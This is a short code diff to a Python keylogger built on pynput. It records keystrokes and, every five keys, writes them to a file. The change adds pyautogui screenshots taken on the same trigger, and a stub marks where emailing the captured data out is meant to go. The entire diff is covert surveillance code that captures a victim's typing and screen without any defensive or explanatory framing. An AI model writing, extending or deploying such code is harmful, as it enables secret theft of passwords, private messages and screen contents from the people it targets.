@@ -1,17 +1,21 @@
 import pynput
+import pyautogui, pathlib
 
 from pynput.keyboard import Key, Listener
 
 count = 0
 keys = []
+imgCount = 0
+
+def screenshot():
+    screenshot = pyautogui.screenshot("sc{0}.png".format(str(imgCount)))
 
 def send_file(keys):
     pass
 # do email sending stuff here
 
-
 def on_press(key):
-    global keys, count
+    global keys, count, imgCount
 
     keys.append(key)
     count += 1
@@ -20,6 +24,8 @@ def on_press(key):
     if count >= 5:
         count = 0
         write_file(keys)
+        imgCount += 1
+        screenshot()
         #send_file(keys)
         keys = []
 
